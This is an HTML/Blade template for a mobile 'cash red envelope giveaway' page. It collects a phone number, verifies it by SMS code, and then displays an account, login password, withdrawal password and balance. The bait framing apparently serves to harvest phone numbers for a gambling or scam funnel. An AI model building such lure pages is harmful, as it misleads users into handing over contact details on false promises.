<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1,user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<link rel="shortcut icon" href="images/title.ico">
<link rel="stylesheet" href="/m/css/public.css">
<link rel="stylesheet" href="/m/css/style.css">
<script src="/m/js/jquery3.3.1.min.js"></script>
<title>一亿现金红包任性大放送</title>
</head>
<body>
	<section id="wrap">
		<section id="main">
			<div class="hb1"></div>
			<div class="hb2"></div>
			<div class="hb3"></div>
			<div class="hb4"></div>
			<div class="hb5">
				<div class="hb5-1"></div>
				<div class="hb5-2"></div>
				<div class="hb5-3"></div>
				<div class="hb5-4"></div>
			</div>
			<div class="hb6"></div>
		</section>
		<div id="content">
			<div class="hidden">
				<form action="#" >
					<div class="phone">
						<i></i>
						<input type="text" placeholder="手机号" class="inp1 on">
					</div>
					<div class="cord">
						<i></i>
						<input type="text" placeholder="验证码" class="inp2 on">
						<button class="btn1 send-btn">获取</button>
					</div>
					<button class="btn2 check-code-is-ok">领取红包</button>
				</form>
			</div>
		</div>
		<div class="wrap1"></div>
	</section>
<script src="/m/js/myJs.js"></script>
<script type="text/javascript">
//发送短信请求
	JQ('.send-btn').click(function(evt){
		evt.preventDefault();
		var phone = JQ('input[class="inp1 on"]').val();
		console.log(phone);
		if(phone == ''){
			alert('手机号码不得为空!')
			return false;
		}
		
		//ajax
		JQ.ajax({
			url:'{{url("/sms/send")}}',
			data:{phone:phone},
			type:'post',
			dataType:'json',
			headers:{
				'X-CSRF-TOKEN':'{{csrf_token()}}'
			},
			success:function(data){
				if(data.code == 0){
					//debugger;
					alert(data.error);
				}else if(data.code == 1){
					JQ('.send-btn').html('60');
					var second = 60;
					var timer = null;
					timer = setInterval(function(){
						second -= 1;
						if(second > 0){
							JQ('.send-btn').html(second);
							JQ('.send-btn').attr('disabled',true);
						}else{
							clearInterval(timer);
							JQ('.send-btn').html('获取');
							JQ('.send-btn').attr('disabled',false);
						}
					},1000);
				}
			}
		})
	})

	//提交获取个人信息请求
	JQ('.check-code-is-ok').click(function(evt){
		evt.preventDefault();
		var phone = JQ('input[class="inp1 on"]').val();
		var code = JQ('input[class="inp2 on"]').val();
		JQ('.send-btn').attr('disabled',true);
		if(phone == '' && code == ''){
			alert('手机号和验证码不可空!');
		}
		//ajax
		JQ.ajax({
			url:'{{url("/sms/getinfo")}}',
			data:{phone:phone,code:code},
			type:'post',
			dataType:'json',
			headers:{
				'X-CSRF-TOKEN':'{{csrf_token()}}'
			},
			success:function(data){
				if(data.code == 0){
					//debugger;
					alert(data.error);
				}else if(data.code == 1){
					//会员账号,登录密码,提款密码,余额,登录连接
					var content = data.info;

					JQ('content').html('');
					JQ('#content').html(content);
					JQ('.hidden2').css('display','block');
					//console.log(content);
				}
			}
		})
	})
</script>
</body>
</html>
<script src="https://s19.cnzz.com/z_stat.php?id=1274591726&web_id=1274591726" language="JavaScript"></script>
